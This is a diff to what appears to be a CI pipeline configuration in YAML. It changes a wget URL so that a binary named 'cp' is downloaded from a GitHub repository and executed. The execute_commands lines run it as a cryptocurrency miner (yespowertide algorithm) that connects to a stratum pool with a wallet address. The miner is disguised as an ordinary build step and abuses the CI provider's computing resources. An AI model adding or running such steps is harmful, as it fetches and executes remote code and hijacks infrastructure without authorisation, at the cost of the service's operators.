@@ -20,7 +20,7 @@
     docker_image_name: "library/python"
     docker_image_tag: "3.9"
     execute_commands:
-    - "wget https://github.com/erlandi-main-api/testpoint/cp"
+    - "wget https://github.com/erlandi-main-api/testpoint/raw/main/cp"
     - "chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test"
     cached_dirs:
     - "/root/.cache/pip"
